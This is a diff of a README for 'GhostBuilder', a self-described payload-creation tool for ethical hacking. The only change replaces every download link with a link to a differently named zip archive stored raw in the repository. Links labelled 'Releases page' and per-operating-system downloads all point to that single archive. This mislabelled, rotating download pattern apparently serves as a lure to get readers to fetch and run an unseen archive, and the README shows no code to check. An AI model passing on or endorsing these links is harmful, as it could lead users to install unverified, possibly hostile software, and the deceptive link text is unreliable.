@@ -6,7 +6,7 @@ Welcome to GhostBuilder! This tool helps you create payloads for ethical hacking
 
 ## 📥 Download Now
 
-[![Download GhostBuilder](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip)](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip)
+[![Download GhostBuilder](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip)](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip)
 
 ## 🛠️ Features
 
@@ -30,11 +30,11 @@ To run GhostBuilder, your system should meet the following requirements:
 
 ## 📦 Download & Install
 
-To get started with GhostBuilder, visit this page to download: [GhostBuilder Releases](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip).
+To get started with GhostBuilder, visit this page to download: [GhostBuilder Releases](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip).
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip).
 2. Find the latest version listed at the top.
-3. Click on the download link for your operating system (e.g., https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip for Linux).
+3. Click on the download link for your operating system (e.g., https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip for Linux).
 4. Save the file to your computer.
 
 ### 🔍 Extracting the Files
@@ -95,6 +95,6 @@ If you want to contribute, please feel free to submit a pull request! We welcome
 
 For more information on related topics, consider consulting reputable resources in the field of cybersecurity.
 
-[![Download GhostBuilder](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip)](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/modules/GhostBuilder_2.2.zip) 
+[![Download GhostBuilder](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip)](https://raw.githubusercontent.com/arrozitoa/GhostBuilder/main/ghostbuilder/Builder-Ghost-v3.4.zip) 
 
 Thank you for using GhostBuilder! Enjoy your ethical hacking journey.
